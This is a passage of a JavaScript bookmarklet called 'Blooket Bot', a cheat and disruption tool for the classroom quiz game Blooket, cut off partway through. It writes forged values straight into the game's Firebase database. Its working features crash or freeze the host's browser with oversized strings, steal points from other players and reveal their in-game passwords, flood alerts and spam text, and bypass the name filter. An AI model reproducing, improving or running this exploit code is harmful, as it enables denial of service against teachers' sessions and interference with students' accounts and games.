javascript: if (window.location.host !== "fb.blooket.com") {
    alert("This must be run on fb.blooket.com!");
    throw "Click here to run: https://fb.blooket.com/";
} document.write('<html prefix="og: https://ogp.me/ns#"><link href="https://fonts.googleapis.com/css?family=Nunito:400,700|Titan+One|Creepster|Satisfy|Eczar:700"rel=stylesheet><link href=https://cdn.glitch.global/50648a61-8fe9-4ce0-a01c-baff9438bbf2/bblogo.png rel=icon><title>Blooket Bot</title><style>.mainBody{margin:0;padding:0;position:absolute;top:0;left:0;font-family:Nunito,sans-serif;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;color:#3a3a3a;width:100%;min-height:100vh}._checkers_l90pt_12{z-index:-1;position:absolute;top:50%;left:50%;transform:translate(-50%,-50%) rotate(15deg);opacity:.08;background-image:url(https://ac.blooket.com/dashboard/65a43218fd1cabe52bdf1cda34613e9e.png);background-size:550px;width:200%;height:200%}.errorBar{position:absolute;top:100%;color:#fff;background-color:#e84135;min-height:55px;width:100%;left:0;padding:11px 5px 5px;box-sizing:border-box;box-shadow:inset 0 6px #0003;overflow:hidden;z-index:10;display:flex;justify-content:center;align-items:center;font-size:20px;transition:.1s}.joinButton{height:60px;width:60px;cursor:pointer;overflow:hidden;outline:0;background-color:#fff;padding-bottom:6px;box-shadow:inset 0 -6px #0003,0 0 4px #00000026;border-radius:5px;display:flex;justify-content:center;align-items:center;transition:.2s}.joinButton:hover{transform:scale(.9)}.nameInput{width:100%;height:100%;background-color:transparent;border:none;padding:5px;box-sizing:border-box;font-size:35px;font-weight:700;text-align:center;outline:0;font-family:Nunito,sans-serif;color:#5f5f5f}.idInputContainer{width:200px;height:60px;padding-bottom:6px;box-shadow:inset 0 -6px #0003,0 0 4px #00000026;background-color:#fff;border-radius:6px}.nameInputContainer{width:348px;height:60px;padding-bottom:6px;box-shadow:inset 0 -6px #0003,0 0 4px #00000026;background-color:#fff;border-radius:6px}.idInput{width:100%;height:100%;background-color:transparent;border:none;padding:5px;box-sizing:border-box;font-size:35px;font-weight:700;text-align:center;font-family:Nunito,sans-serif;outline:0;color:#5f5f5f}.inputcontainer:hover{box-shadow:0 8px 16px 0 rgba(0,0,0,.2),0 6px 20px 0 rgba(0,0,0,.19)}*{touch-action:manipulation}.normtext{font-size:40px;color:#fff;text-align:left;margin-left:1px;font-family:Titan One,sans-serif;-webkit-user-select:none;-moz-user-select:none;user-select:none;text-decoration:none}.codecontainer{margin:5px}.btext{font-size:140%;color:#5f5f5f;-webkit-user-select:none}#ctrlpanel{margin:9px}.inputcontainer{background-color:orange;display:inline-block;border-radius:4px;user-select:none;cursor:pointer}.inputcontainer>div{font-size:23px;text-align:center;font-family:Titan One,sans-serif;color:#000}.inputcontainer>input{margin:4px;text-align:center;font-size:18px}.inputcontainer>select{margin:4px;text-align:center;font-size:18px;width:-webkit-fill-available}button{font-size:23px}.cheatcontainer>*{margin:15px}checkbox{background-color:#fff;font-size:30px;margin:2px;user-select:none;cursor:pointer;font-family:Titan One,sans-serif;padding-right:2px;border-radius:5px;font-weight:700}checkbox::before{content:"X";font-weight:lighter}checkbox[checked]::before{content:"✔"}::selection{background-color:#0ab6c250}.chat{position:fixed;margin:10px;background-color:orange;border-radius:10px}.chatcontainer{width:750px;height:250px;background-color:#202020a0;margin:10px;flex-direction:column-reverse;display:flex;overflow-y:auto}.chatmsg{color:#fff;font-size:22px;margin-left:1px}.chatinpcontainer{margin:10px}#chat{width:-webkit-fill-available;font-size:22px}.dragcontainer{background-color:orange;font-size:20px;position:absolute;border-radius:10px;font-weight:700}#drag{margin:5px;user-select:none;cursor:move}</style><div class=mainBody style=z-index:0;background-color:#099441;overflow:hidden><div class=_checkers_l90pt_12></div><div class=chat style=top:350;left:200;display:none><div class=chatcontainer><div class=chatmsg></div></div><div class=chatinpcontainer><input id=chat placeholder="Type a message..."></div><div class=dragcontainer style=background-color:orange;font-size:20px;position:absolute;border-radius:10px;font-weight:700><div id=drag>Drag</div></div></div><div class=codecontainer id=cc><div class=normtext>Enter code:</div><div class=idInputContainer><input id=gcode placeholder="Game ID"class=idInput></div><div class=nameInputContainer><input id=gname placeholder=Nickname class=nameInput></div><div class=joinButton onclick=join() role=button><div class=btext>Join</div></div><text class=normtext id=ostatus style=display:none></text><text class=normtext>Incognito Mode:</text><checkbox id=icogmode checked></checkbox><br><text class=normtext>Bypass Filter:</text><checkbox id=bcf></checkbox><br><text class=normtext>First Place Switch:</text><checkbox id=fpswitch checked></checkbox><br><text class=normtext>*for first place switch to work your amount must not be a number!</text></div><div id=ctrlpanel></div><div class=normtext id=status>Status: Loading...</div><div class=normtext>Created by <a href=https://www.youtube.com/@crypto.7562 target=_blank>Ducklife3141</a></div><div class=normtext><a href=https://discord.gg/blooket target=_blank>Join the discord server!</a></div><div class=errorBar style=transform:translateY(0) id=error></div></div><script src=https://zalgo.org/lunicode.js><\/script><script>function join(){var e=document.getElementById("gcode"),t=document.getElementById("gname");joinGame(e.value,t.value,!!document.getElementById("icogmode").getAttribute("checked"))}function errorBar(e){var t=document.getElementById("error");t.innerText=e,t.style.transform="translateY(-100%)",setTimeout(function(){t.style.transform="translateY(0%)"},4e3)}blooketbotRun()<\/script>'), window.blooketbotRun = async function() {
    const {
        initializeApp: e,
        deleteApp: t
    } = await import("https://www.gstatic.com/firebasejs/10.10.0/firebase-app.js"), {
        getAuth: n,
        signInWithCustomToken: o,
        setPersistence: a
    } = await import("https://www.gstatic.com/firebasejs/10.10.0/firebase-auth.js"), {
        getDatabase: r,
        ref: i,
        set: c,
        get: l,
        onValue: s
    } = await import("https://www.gstatic.com/firebasejs/10.10.0/firebase-database.js");
    var u = ["Chick", "Chicken", "Cow", "Goat", "Horse", "Pig", "Sheep", "Duck", "Alpaca", "Dog", "Cat", "Rabbit", "Goldfish", "Hamster", "Turtle", "Kitten", "Puppy", "Bear", "Moose", "Fox", "Raccoon", "Squirrel", "Owl", "Hedgehog", "Deer", "Wolf", "Beaver", "Tiger", "Orangutan", "Cockatoo", "Parrot", "Anaconda", "Jaguar", "Macaw", "Toucan", "Panther", "Capuchin"],
        d = {},
        f = {},
        p = 0,
        m = {
            Hack: "cr",
            Gold: "g",
            Candy: "g",
            Defense2: "d",
            Pirate: "d",
            Fish: "w",
            Brawl: "xp",
            Factory: "ca"
        },
        h = {
            Hack: [{
                type: "button",
                name: "Crash host(crypto)",
                action: function(e) {
                    M("cr/t", "t"), e.innerText = "Crashing"
                }
            }, {
                type: "button",
                name: "Freeze Scoreboard",
                action: function(e) {
                    null != e.frozen ? e.frozen = !e.frozen : e.frozen = !0, e.frozen ? M("tat/t", "t") : M("tat", "t"), e.innerText = e.frozen ? "Unfreeze Scoreboard" : "Freeze Scoreboard"
                }
            }, {
                type: "button",
                name: "Turn Host Screen Green",
                action: function(e) {
                    null != e.green ? e.green = !e.green : e.green = !0, e.green ? M("cr", function() {
                        for (var e = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", t = 0; t < 3e5; t++) e += String.fromCharCode(3655), t % 61 == 0 && (e += String.fromCharCode(32));
                        return e += "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
                    }()) : M("cr", 0), e.innerText = e.green ? "Ungreen Host Screen" : "Turn Host Screen Green"
                }
            }, {
                type: "button",
                name: "Set Crash Password",
                action: function(e) {
                    null != e.frozen ? e.frozen = !e.frozen : e.frozen = !0, e.frozen ? M("p/toString", "t") : M("p", "DogLover3"), e.innerText = e.frozen ? "Remove Crash Password" : "Set Crash Password"
                }
            }, {
                type: "button",
                name: "Set Freeze Password",
                action: function(e) {
                    null != e.frozen ? e.frozen = !e.frozen : e.frozen = !0, e.frozen ? M("p", C(3e6)) : M("p", "DogLover3"), e.innerText = e.frozen ? "Remove Freeze Password" : "Set Freeze Password"
                }
            }, {
                type: "input",
                name: "Set Crypto",
                action: function(e) {
                    M("cr", e)
                }
            }, {
                type: "input",
                name: "Set Password",
                action: function(e) {
                    M("p", e)
                }
            }, {
                type: "select",
                name: "Get User Password",
                computed: function(e) {
                    return Object.keys(f.c).length !== Array.from(e.children).length && Object.keys(f.c)
                },
                action: function(e) {
                    alert(f?.c?.[e]?.p)
                }
            }, {
                type: "select",
                name: "Steal Crypto From",
                computed: function(e) {
                    return Object.keys(f.c).length !== Array.from(e.children).length && Object.keys(f.c)
                },
                action: function(e) {
                    M("tat", `${e}:${prompt("How much crypto do you want to steal?")}`)
                }
            }, {
                type: "input",
                name: "Advertise Text",
                action: function(e) {
                    M("cr", function() {
                        for (var t = new Array(100).fill("1").join(""), n = 0; n < 500; n++) t += e, t += n % 10 == 0 ? "\n\r" : " ";
                        return t
                    }())
                }
            }, {
                type: "select",
                name: "Send Ad Text",
                computed: function(e) {
                    return Object.keys(f.c).length !== Array.from(e.children).length && Object.keys(f.c)
                },
                action: function(e) {
                    var t = prompt("Enter the text you would like to send (this will override your blook):");
                    if (t) {
                        if (t.includes(":")) return void alert("Ad text cannot include a colon!");
                        M("b", "Parrot:" + function() {
                            for (var e = "", n = 0; n < 500; n++) e += t + " ";
                            return e
                        }()), M("tat", `${e}:100`)
                    }
                }
            }, {
                type: "input",
                name: "Flood Alert Box",
                action: function(e) {
                    M("tat", `${d.name}:${Date.now()}${new Array(1700).fill(e+" ").join("")}`)
                }
            }],
            Gold: [{
                type: "button",
                name: "Crash host(gold)",
                action: function(e) {
                    M("g/t", "t"), e.innerText = "Crashing"
                }
            }, {
                type: "button",
                name: "Freeze Scoreboard",
                action: function(e) {
                    null != e.frozen ? e.frozen = !e.frozen : e.frozen = !0, e.frozen ? M("tat/t", "t") : M("tat", "t"), e.innerText = e.frozen ? "Unfreeze Scoreboard" : "Freeze Scoreboard"
                }
            }, {
                type: "select",
                name: "Steal Gold From",
                computed: function(e) {
                    return Object.keys(f.c).length !== Array.from(e.children).length && Object.keys(f.c)
                },
                action: function(e) {
                    M("tat", `${e}:${prompt("How much gold do you want to steal?")}`)
                }
            }, {
                type: "select",
                name: "Set Player's Gold",
                computed: function(e) {
                    return Object.keys(f.c).length !== Array.from(e.children).length && Object.keys(f.c)
                },
                action: function(e) {
                    M("tat", `${e}:swap:${prompt("What do you want to set it to?")}`)
                }
            }, {
                type: "input",
                name: "Set Gold",
                action: function(e) {
                    M("g", e)
                }
            }, {
                type: "select",
                name: "Send Ad Text",
                computed: function(e) {
                    return Object.keys(f.c).length !== Array.from(e.children).length && Object.keys(f.c)
                },
                action: function(e) {
                    var t = prompt("Enter the text you would like to send (this will override your blook):");
                    if (t) {
                        if (t.includes(":")) return void alert("Ad text cannot include a colon!");
                        M("b", "Dog:" + new Array(500).fill(t).join(" ")), M("tat", `${e}:100`)
                    }
                }
            }, {
                type: "input",
                name: "Flood Alert Box",
                action: function(e) {
                    M("tat", `${d.name}:${Date.now()}${new Array(1700).fill(e+" ").join("")}`)
                }
            }],
            Candy: [{
                type: "button",
                name: "Crash host(candy)",
                action: function(e) {
                    M("g/t", "t"), e.innerText = "Crashing"
                }
            }, {
                type: "button",
                name: "Freeze Scoreboard",
                action: function(e) {
                    null != e.frozen ? e.frozen = !e.frozen : e.frozen = !0, e.frozen ? M("tat/t", "t") : M("tat", "t"), e.innerText = e.frozen ? "Unfreeze Scoreboard" : "Freeze Scoreboard"
                }
            }, {
                type: "select",
                name: "Steal Candy From",
                computed: function(e) {
                    return Object.keys(f.c).length !== Array.from(e.children).length && Object.keys(f.c)
                },
                action: function(e) {
                    M("tat", `${e}:${prompt("How much candy do you want to steal?")}`)
                }
            }, {
                type: "select",
                name: "Set Player's Candy",
                computed: function(e) {
                    return Object.keys(f.c).length !== Array.from(e.children).length && Object.keys(f.c)
                },
                action: function(e) {
                    M("tat", `${e}:swap:${prompt("What do you want to set it to?")}`)
                }
            }, {
                type: "input",
                name: "Set Candy",
                action: function(e) {
                    M("g", e)
                }
            }, {
                type: "select",
                name: "Send Ad Text",
                computed: function(e) {
                    return Object.keys(f.c).length !== Array.from(e.children).length && Object.keys(f.c)
                },
                action: function(e) {
                    var t = prompt("Enter the text you would like to send (this will override your blook):");
                    if (t) {
                        if (t.includes(":")) return void alert("Ad text cannot include a colon!");
                        M("b", "Dog:" + new Array(500).fill(t).join(" ")), M("tat", `${e}:100`)
                    }
                }
            }, {
                type: "input",
                name: "Flood Alert Box",
                action: function(e) {
                    M("tat", `${d.name}:${Date.now()}${new Array(1700).fill(e+" ").join("")}`)
                }
            }],
            Defense2: [{
                type: "button",
                name: "Crash host(defense2)",
                action: function(e) {
                    M("d/t", "t"), e.innerText = "Crashing"
                }
            }, {
                type: "button",
                name: "Freeze Scoreboard",
                action: function(e) {
                    null != e.frozen ? e.frozen = !e.frozen : e.frozen = !0, e.frozen ? M("r/toString", "t") : M("r", 1), e.innerText = e.frozen ? "Unfreeze Scoreboard" : "Freeze Scoreboard"
                }
            }, {
                type: "input",
                name: "Set Damage",
                action: function(e) {
                    M("d", e)
                }
            }, {
                type: "input",
                name: "Set Round",
                action: function(e) {
                    M("r", e)
                }
            }, {
                type: "input",
                name: "Flood Alert Box",
                action: function(e) {
                    M("r", `${Date.now()}${new Array(1700).fill(e+" ").join("")}`)
                }
            }],
            Defense: [{
                type: "button",
                name: "Freeze Scoreboard",
                action: function(e) {
                    null != e.frozen ? e.frozen = !e.frozen : e.frozen = !0, e.frozen ? M("d/toString", "t") : M("d", 0), e.innerText = e.frozen ? "Unfreeze Scoreboard" : "Freeze Scoreboard"
                }
            }, {
                type: "input",
                name: "Set Damage",
                action: function(e) {
                    M("d", e)
                }
            }],
            Fish: [{
                type: "button",
                name: "Freeze Scoreboard",
                action: function(e) {
                    null != e.frozen ? e.frozen = !e.frozen : e.frozen = !0, e.frozen ? M("f/t", "t") : M("f", "Old Boot"), e.innerText = e.frozen ? "Unfreeze Scoreboard" : "Freeze Scoreboard"
                }
            }, {
                type: "input",
                name: "Set Weight",
                action: function(e) {
                    M("w", e)
                }
            }, {
                type: "input",
                name: "Set Caught Fish",
                action: function(e) {
                    M("f", e)
                }
            }, {
                type: "input",
                name: "Send Distraction",
                action: function(e) {
                    M("s", !0), M("f", e)
                }
            }],
            Pirate: [{
                type: "button",
                name: "Crash host(pirate)",
                action: function(e) {
                    M("d/t", "t"), e.innerText = "Crashing"
                }
            }, {
                type: "button",
                name: "Freeze Scoreboard",
                action: function(e) {
                    null != e.frozen ? e.frozen = !e.frozen : e.frozen = !0, e.frozen ? M("tat/t", "t") : M("tat", "t"), e.innerText = e.frozen ? "Unfreeze Scoreboard" : "Freeze Scoreboard"
                }
            }, {
                type: "select",
                name: "Steal Doubloons From",
                computed: function(e) {
                    return Object.keys(f.c).length !== Array.from(e.children).length && Object.keys(f.c)
                },
                action: function(e) {
                    M("tat", `${e}:${prompt("How many doubloons do you want to steal?")}`)
                }
            }, {
                type: "input",
                name: "Set Doubloons",
                action: function(e) {
                    M("d", e)
                }
            }, {
                type: "select",
                name: "Send Ad Text",
                computed: function(e) {
                    return Object.keys(f.c).length !== Array.from(e.children).length && Object.keys(f.c)
                },
                action: function(e) {
                    var t = prompt("Enter the text you would like to send (this will override your blook):");
                    if (t) {
                        if (t.includes(":")) return void alert("Ad text cannot include a colon!");
                        M("b", "Parrot:" + function() {
                            for (var e = "", n = 0; n < 500; n++) e += t + " ";
                            return e
                        }()), M("tat", `${e}:100`)
                    }
                }
            }, {
                type: "input",
                name: "Flood Alert Box",
                action: function(e) {
                    M("tat", `${d.name}:${Date.now()}${new Array(1700).fill(e+" ").join("")}`)
                }
            }],
            Dino: [{
                type: "button",
                name: "Crash host(dino)",
                action: function(e) {
                    M("f/t", "t"), e.innerText = "Crashing"
                }
            }, {
                type: "button",
                name: "Freeze Scoreboard",
                action: function(e) {
                    null != e.frozen ? e.frozen = !e.frozen : e.frozen = !0, e.frozen ? M("tat/t", "t") : M("tat", "t"), e.innerText = e.frozen ? "Unfreeze Scoreboard" : "Freeze Scoreboard"
                }
            }, {
                type: "input",
                name: "Set Fossils",
                action: function(e) {
                    M("f", e)
                }
            }, {
                type: "staticsel",
                name: "Set Cheating",
                values: ["true", "false"],
                action: function(e) {
                    M("ic", e)
                }
            }, {
                type: "select",
                name: "Catch Player Cheating",
                computed: function(e) {
                    return Object.keys(f.c).length !== Array.from(e.children).length && Object.keys(f.c)
                },
                action: function(e) {
                    M("tat", `${e}:true`)
                }
            }],
            Cafe: [{
                type: "button",
                name: "Freeze Scoreboard",
                action: function(e) {
                    null != e.frozen ? e.frozen = !e.frozen : e.frozen = !0, e.frozen ? M("tat/t", "t") : M("tat", "t"), e.innerText = e.frozen ? "Unfreeze Scoreboard" : "Freeze Scoreboard"
                }
            }, {
                type: "input",
                name: "Set Cash",
                action: function(e) {
                    M("ca", e)
                }
            }, {
                type: "input",
                name: "Set Upgrade(ex. Cereal:1)",
                action: function(e) {
                    M("up", e)
                }
            }, {
                type: "select",
                name: "Attack player",
                computed: function(e) {
                    return Object.keys(f.c).length !== Array.from(e.children).length && Object.keys(f.c)
                },
                action: function(e) {
                    M("tat", `${e}:${prompt("What attack do you want(inspect, pay, etc)?")}`)
                }
            }, {
                type: "input",
                name: "Flood Alert Box",
                action: function(e) {
                    M("up", `a:${Date.now()}${new Array(1700).fill(e+" ").join("")}`)
                }
            }],
            Brawl: [{
                type: "button",
                name: "Crash host(brawl)",
                action: function(e) {
                    M("xp/t", "t"), e.innerText = "Crashing"
                }
            }, {
                type: "button",
                name: "Freeze Scoreboard",
                action: function(e) {
                    null != e.frozen ? e.frozen = !e.frozen : e.frozen = !0, e.frozen ? M("up/t", "t") : M("up", "Dark Energy:2"), e.innerText = e.frozen ? "Unfreeze Scoreboard" : "Freeze Scoreboard"
                }
            }, {
                type: "input",
                name: "Set XP",
                action: function(e) {
                    M("xp", e)
                }
            }, {
                type: "input",
                name: "Set Upgrade(upgrade:level)",
                action: function(e) {
                    M("up", e)
                }
            }, {
                type: "input",
                name: "Flood Alert Box",
                action: function(e) {
                    M("up", `__proto__:${Date.now()}${new Array(1700).fill(e+" ").join("")}`)
                }
            }],
            Racing: [{
                type: "button",
                name: "Freeze Scoreboard and Attacks",
                action: function(e) {
                    null != e.frozen ? e.frozen = !e.frozen : e.frozen = !0, e.frozen ? M("pr/toString", "t") : M("pr", 0), e.innerText = e.frozen ? "Unfreeze Scoreboard and Attacks" : "Freeze Scoreboard and Attacks"
                }
            }, {
                type: "input",
                name: "Set Questions Left",
                action: function(e) {
                    M("pr", f.s.a - parseInt(e))
                }
            }, {
                type: "select",
                name: "Attack player",
                computed: function(e) {
                    return Object.keys(f.c).length !== Array.from(e.children).length && Object.keys(f.c)
                },
                action: function(e) {
                    M("tat", `${e}:${prompt("Which attack do you want to perform(rocket,etc)?")}`)
                }
            }],
            Classic: [{
                type: "button",
                name: "Freeze Question",
                action: function(e) {
                    null != e.frozen ? e.frozen = !e.frozen : e.frozen = !0, e.frozen ? M("a/toString", "t") : M("a", 1), e.innerText = e.frozen ? "Unfreeze Question" : "Freeze Question"
                }
            }],
            Royale: [{
                type: "button",
                name: "Send Crash Answer",
                action: function(e) {
                    null != e.frozen ? e.frozen = !e.frozen : e.frozen = !0, e.frozen ? H(`${d.gid}/a/${d.name}/a/toString`, "t") : H(`${d.gid}/a/${d.name}/a/toString`, 2), e.innerText = e.frozen ? "Unsend Crash Answer" : "Send Crash Answer"
                }
            }],
            Rush: [{
                type: "button",
                name: "Freeze Host's Computer",
                action: function(e) {
                    M("bs", 1e307), e.innerHTML = "He aint coming back from this one!"
                }
            }, {
                type: "button",
                name: "Freeze Scoreboard",
                action: function(e) {
                    null != e.frozen ? e.frozen = !e.frozen : e.frozen = !0, e.frozen ? M("d/toString", "t") : M("d", "t"), e.innerText = e.frozen ? "Unfreeze Scoreboard" : "Freeze Scoreboard"
                }
            }, {
                type: "input",
                name: "Set Blooks",
                action: function(e) {
                    M("bs", e)
                }
            }, {
                type: "input",
                name: "Set Defense",
                action: function(e) {
                    M("d", e)
                }
            }, {
                type: "input",
                name: "Advertise Text",
                action: function(e) {
                    M("d", function() {
                        for (var t = "", n = 0; n < 100; n++) t += "1";
                        for (n = 0; n < 500; n++) t += e, t += n % 10 == 0 ? "\n\r" : " ";
                        return t
                    }())
                }
            }],
            "Rush (teams)": [{
                type: "button",
                name: "Freeze Host's Computer",
                action: function(e) {
                    x("bs", 1e307), e.innerHTML = "He aint coming back from this one!"
                }
            }, {
                type: "input",
                name: "Set Blooks",
                action: function(e) {
                    x("bs", parseInt(e))
                }
            }, {
                type: "input",
                name: "Set Defense",
                action: function(e) {
                    x("d", parseInt(e))
                }
            }],
            Factory: [{
                type: "button",
                name: "Freeze Scoreboard",
                action: function(e) {
                    null != e.frozen ? e.frozen = !e.frozen : e.frozen = !0, e.frozen ? M("ca/toString", "t") : M("ca", 0), e.innerText = e.frozen ? "Unfreeze Scoreboard" : "Freeze Scoreboard"
                }
            }, {
                type: "staticsel",
                name: "Send Distraction",
                values: ["dp"],
                action: function(e) {
                    M("tat", e)
                }
            }, {
                type: "input",
                name: "Set Cash",
                action: function(e) {
                    M("ca", e)
                }
            }]
        },
        y = [{
            type: "staticsel",
            name: "Set Blook",
            values: ["Chick", "Chicken", "Cow", "Goat", "Horse", "Pig", "Sheep", "Duck", "Alpaca", "Dog", "Cat", "Rabbit", "Goldfish", "Hamster", "Turtle", "Kitten", "Puppy", "Bear", "Moose", "Fox", "Raccoon", "Squirrel", "Owl", "Hedgehog", "Deer", "Wolf", "Beaver", "Tiger", "Orangutan", "Cockatoo", "Parrot", "Anaconda", "Jaguar", "Macaw", "Toucan", "Panther", "Capuchin", "Gorilla", "Hippo", "Rhino", "Giraffe", "Snowy Owl", "Polar Bear", "Arctic Fox", "Baby Penguin", "Penguin", "Arctic Hare", "Seal", "Walrus", "Witch", "Wizard", "Elf", "Fairy", "Slime Monster", "Jester", "Dragon", "Queen", "Unicorn", "King", "Two of Spades", "Eat Me", "Drink Me", "Alice", "Queen of Hearts", "Dormouse", "White Rabbit", "Cheshire Cat", "Caterpillar", "Mad Hatter", "King of Hearts", "Toast", "Cereal", "Yogurt", "Breakfast Combo", "Orange Juice", "Milk", "Waffle", "Pancakes", "French Toast", "Pizza", "Earth", "Meteor", "Stars", "Alien", "Planet", "UFO", "Spaceship", "Astronaut", "Lil Bot", "Lovely Bot", "Angry Bot", "Happy Bot", "Watson", "Buddy Bot", "Brainy Bot", "Mega Bot", "Old Boot", "Jellyfish", "Clownfish", "Frog", "Crab", "Pufferfish", "Blobfish", "Octopus", "Narwhal", "Dolphin", "Baby Shark", "Megalodon", "Panda", "Sloth", "Tenrec", "Flamingo", "Zebra", "Elephant", "Lemur", "Peacock", "Chameleon", "Lion", "Amber", "Dino Egg", "Dino Fossil", "Stegosaurus", "Velociraptor", "Brontosaurus", "Triceratops", "Tyrannosaurus Rex", "Ice Bat", "Ice Bug", "Ice Elemental", "Rock Monster", "Dink", "Donk", "Bush Monster", "Yeti", "Dingo", "Echidna", "Koala", "Kookaburra", "Platypus", "Joey", "Kangaroo", "Crocodile", "Sugar Glider", "Deckhand", "Buccaneer", "Swashbuckler", "Treasure Map", "Seagull", "Jolly Pirate", "Pirate Ship", "Kraken", "Captain Blackbeard", "Snow Globe", "Holiday Gift", "Hot Chocolate", "Holiday Wreath", "Stocking", "Gingerbread Man", "Gingerbread House", "Reindeer", "Snowman", "Santa Claus", "Pumpkin", "Swamp Monster", "Frankenstein", "Vampire", "Zombie", "Mummy", "Caramel Apple", "Candy Corn", "Werewolf", "Ghost", "Rainbow Jellyfish", "Blizzard Clownfish", "Lovely Frog", "Lucky Frog", "Spring Frog", "Poison Dart Frog", "Lucky Hamster", "Chocolate Rabbit", "Spring Rabbit", "Lemon Crab", "Pirate Pufferfish", "Donut Blobfish", "Crimson Octopus", "Rainbow Narwhal", "Frost Wreath", "Tropical Globe", "New York Snow Globe", "London Snow Globe", "Japan Snow Globe", "Egypt Snow Globe", "Paris Snow Globe", "Red Sweater Snowman", "Blue Sweater Snowman", "Elf Sweater Snowman", "Santa Claws", "Cookies Combo", "Chilly Flamingo", "Snowy Bush Monster", "Nutcracker Koala", "Sandwich", "Ice Slime", "Frozen Fossil", "Ice Crab", "Rainbow Panda", "White Peacock", "Tiger Zebra", "Teal Platypus", "Red Astronaut", "Orange Astronaut", "Yellow Astronaut", "Lime Astronaut", "Green Astronaut", "Cyan Astronaut", "Blue Astronaut", "Pink Astronaut", "Purple Astronaut", "Brown Astronaut", "Black Astronaut", "Lovely Planet", "Lovely Peacock", "Haunted Pumpkin", "Pumpkin Cookie", "Ghost Cookie", "Red Gummy Bear", "Blue Gummy Bear", "Green Gummy Bear", "Chick Chicken", "Chicken Chick", "Raccoon Bandit", "Owl Sheriff", "Vampire Frog", "Pumpkin King", "Leprechaun", "Anaconda Wizard", "Spooky Pumpkin", "Spooky Mummy", "Agent Owl", "Master Elf", "Party Pig", "Wise Owl", "Spooky Ghost", "Phantom King", "Tim the Alien", "Rainbow Astronaut", "Hamsta Claus", "Light Blue", "Black", "Red", "Purple", "Pink", "Orange", "Lime", "Green", "Teal", "Tan", "Maroon", "Gray", "Mint", "Salmon", "Burgandy", "Baby Blue", "Dust", "Brown", "Dull Blue", "Yellow", "Blue"],
            action: function(e) {
                M("b", e)
            }
        }, {
            type: "input",
            name: "Set Banner",
            action: function(e) {
                M("bg", e)
            }
        }, {
            type: "button",
            name: "Leave Game",
            action: function(e) {
                S(), j(), e.innerText = "Leaving"
            }
        }, {
            type: "button",
            name: "Crash host",
            action: function(e) {
                M("b/toString", "t"), e.innerText = "Crashing"
            }
        }, {
            type: "button",
            name: "Freeze Host",
            action: function(e) {
                m?.[d?.type] || alert("Freeze not found for gamemode!"), M(m[d.type], C(15e4)), e.innerText = "Freezing"
            }
        }, {
            type: "button",
            name: "Open Chat",
            id: "ochat",
            action: function(e) {
                null != e.frozen ? e.frozen = !e.frozen : e.frozen = !0, e.frozen ? (p = 0, g(), document.querySelector(".chat").style.display = "block") : document.querySelector(".chat").style.display = "none", e.innerText = e.frozen ? "Close Chat" : "Open Chat"
            }
        }];

    function g() {
        document.querySelector("#ochat").innerHTML = p > 0 ? `Open Chat <b style="color:#f00000;">(${p})</b>` : "Open Chat"
    }
    var b = 0;

    function x(e, t) {
        return H(`/${d.gid}/a/${d.name}/${e}`, t)
    }

    function k(e) {
        f && f.s ? (function(e) {
            if (!e) return console.log("Game disconnected!"), errorBar("Game crashed!"), S(), void j();
            f.c[d.name] && f.c[d.name].tat && !e.c[d.name].tat && alert("Attack complete!");
            if ("fin" === e.stg && d.connected) return d.connected = !1, console.log("Game ended!"), console.log("Time: " + (t = (Date.now() - new Date(f.s.d).getTime()) / 6e4, Math.floor(t) + ":" + Math.floor(60 * t) % 60)), S(), void j();
            var t
        }(e), function(e) {
            var t = e.c,
                n = f.c;
            for (var o in t) t[o]?.msg?.msg && (n[o]?.msg?.msg ? t[o].msg.i !== n[o].msg.i && w(t[o].msg.msg, o) : w(t[o].msg.msg, o))
        }(e)) : function(e) {
            var t = e.s.t;
            "Rush" === t && "Teams" === e.s.m && (t = "Rush (teams)");
            console.log("Game type: " + t),
                function(e) {
                    d.type = e;
                    var t = document.getElementById("ctrlpanel");
                    if (document.getElementById("cc").style.display = "none", t.appendChild(A("Bot Successful! Type: " + e)), h[e]) {
                        t.appendChild(A("Cheats: "));
                        var n = B();
                        h[e].forEach((e => {
                            switch (e.type) {
                                case "button":
                                    n.appendChild(F(e.name, e.action));
                                    break;
                                case "input":
                                    n.appendChild(E(e.name, e.action));
                                    break;
                                case "select":
                                    n.appendChild(P(e.name, e.computed, e.action));
                                    break;
                                case "staticsel":
                                    n.appendChild($(e.name, e.values, e.action));
                                    break;
                                default:
                                    console.log("Unsupported!")
                            }
                        })), t.appendChild(n)
                    }
                    t.appendChild(A("Global Cheats:")), t.appendChild(function() {
                        var e = B();
                        return y.forEach((t => {
                            switch (t.type) {
                                case "button":
                                    let n = F(t.name, t.action);
                                    t.id && (n.id = t.id), e.appendChild(n);
                                    break;
                                case "input":
                                    e.appendChild(E(t.name, t.action));
                                    break;
                                case "select":
                                    e.appendChild(P(t.name, t.computed, t.action));
                                    break;
                                case "staticsel":
                                    e.appendChild($(t.name, t.values, t.action));
                                    break;
                                default:
                                    console.log("Unsupported!")
                            }
                        })), e
                    }())
                }(t)
        }(e), f = e
    }

    function z(e) {}

    function w(e, t) {
        G(`${t}: ${e}`), "none" == document.querySelector(".chat").style.display && (p++, g())
    }

    function S() {
        d.connected && (M("", {}), d.fbdb = !1, t(d.liveApp), d.connected = !1, d.liveApp = !1, f = {}, T("Ready"))
    }
    window.joinGame = function(e, t, n) {
        d.connecting ? errorBar("Connecting to game, please wait...") : (document.getElementById("bcf").getAttribute("checked") && (t = "" + t.split("").reverse().join("")), document.getElementById("fpswitch").getAttribute("checked") && (t = String.fromCharCode(32) + String.fromCharCode(32) + t), t, L(e, t, n))
    };
    var v = ["", "俿", "佒", "⾟", "็", "็", "็", "็", "็", "็", "俱", "俲"];

    function C(e) {
        return new Array(e).fill().map((e => v[Math.floor(Math.random() * v.length)])).join("")
    }

    function A(e) {
        var t = document.createElement("div");
        return t.className = "normtext", t.innerText = e, t
    }

    function B() {
        var e = document.createElement("div");
        return e.className = "cheatcontainer", e
    }

    function T(e) {
        document.getElementById("status").innerText = "Status: " + e
    }

    function F(e, t) {
        var n = document.createElement("button");
        return n.innerText = e, n.addEventListener("click", (function() {
            t(n)
        })), n
    }

    function j() {
        var e = document.getElementById("ctrlpanel"),
            t = document.getElementById("cc");
        document.querySelector(".chat").style.display = "none", e.innerHTML = "", t.style.display = "block", errorBar("Game Ended!")
    }

